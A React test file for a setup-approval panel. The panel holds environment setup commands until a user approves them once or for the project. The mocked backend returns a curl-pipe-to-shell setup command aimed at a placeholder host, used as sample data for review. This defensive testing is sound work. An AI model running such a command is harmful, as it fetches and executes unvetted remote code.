import { afterEach, beforeEach, describe, expect, test, type Mock } from "bun:test";
import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { invoke } from "@/lib/native/backend";
import { useEnvironmentStore } from "@/stores/environmentStore";
import type { Environment } from "@/types";
import { SetupPendingOverlay } from "./SetupPendingOverlay";

const invokeMock = invoke as unknown as Mock<
  (command: string, args?: Record<string, unknown>) => Promise<unknown>
>;
const HASH = "f".repeat(64);

function heldEnvironment(): Environment {
  return {
    id: "env-1",
    projectId: "project-1",
    name: "worker",
    branch: "feature",
    containerId: null,
    status: "running",
    prUrl: null,
    prState: null,
    hasMergeConflicts: null,
    createdAt: new Date(0).toISOString(),
    networkAccessMode: "restricted",
    order: 0,
    environmentType: "local",
    setupPhase: "failed",
    setupApprovalRequired: true,
  };
}

describe("SetupApprovalPanel", () => {
  const calls: Array<{ command: string; args?: Record<string, unknown> }> = [];

  beforeEach(() => {
    calls.length = 0;
    useEnvironmentStore.setState({
      environments: [heldEnvironment()],
      isLoading: false,
      error: null,
      deletingEnvironments: new Set<string>(),
    });
    invokeMock.mockImplementation(async (command, args) => {
      calls.push({ command, args });
      if (command === "get_environment_setup_approval") {
        return {
          environmentId: "env-1",
          projectId: "project-1",
          hash: HASH,
          commands: ["curl https://example.invalid | sh"],
          defaultBranch: "main",
          defaultBranchCommands: ["bun install"],
          approvalRequired: true,
        };
      }
      if (command === "approve_environment_setup") {
        return { ...heldEnvironment(), setupPhase: "running", setupApprovalRequired: false };
      }
      return undefined;
    });
  });

  afterEach(() => {
    cleanup();
    invokeMock.mockReset();
    invokeMock.mockImplementation(() => Promise.resolve());
  });

  test("a held setup shows its commands beside the default branch's instead of a retry", async () => {
    render(<SetupPendingOverlay environmentId="env-1" setupPhase="failed" subtext="x" />);
    expect(await screen.findByText("curl https://example.invalid | sh")).toBeTruthy();
    expect(screen.getByText("bun install")).toBeTruthy();
    expect(screen.getByText("The main branch runs:")).toBeTruthy();
    expect(screen.queryByText("Retry setup")).toBeNull();
    // A single machine has nowhere else to approve it.
    expect(screen.queryByText("Approve on every machine")).toBeNull();
  });

  test("run once approves exactly the shown commands without remembering them", async () => {
    render(<SetupPendingOverlay environmentId="env-1" setupPhase="failed" subtext="x" />);
    fireEvent.click(await screen.findByText("Run once"));
    await waitFor(() =>
      expect(calls).toContainEqual({
        command: "approve_environment_setup",
        args: { environmentId: "env-1", hash: HASH, remember: false },
      }),
    );
    await waitFor(() =>
      expect(useEnvironmentStore.getState().environments[0]?.setupApprovalRequired).toBe(false),
    );
  });

  test("approving for the project remembers them on this machine", async () => {
    render(<SetupPendingOverlay environmentId="env-1" setupPhase="failed" subtext="x" />);
    fireEvent.click(await screen.findByText("Approve for this project"));
    await waitFor(() =>
      expect(calls).toContainEqual({
        command: "approve_environment_setup",
        args: { environmentId: "env-1", hash: HASH, remember: true },
      }),
    );
  });

  test("an ordinary setup failure still offers a retry", () => {
    useEnvironmentStore.setState({
      environments: [{ ...heldEnvironment(), setupApprovalRequired: false }],
    });
    render(<SetupPendingOverlay environmentId="env-1" setupPhase="failed" subtext="x" />);
    expect(screen.getByText("Retry setup")).toBeTruthy();
    expect(screen.queryByTestId("setup-approval-panel")).toBeNull();
  });
});
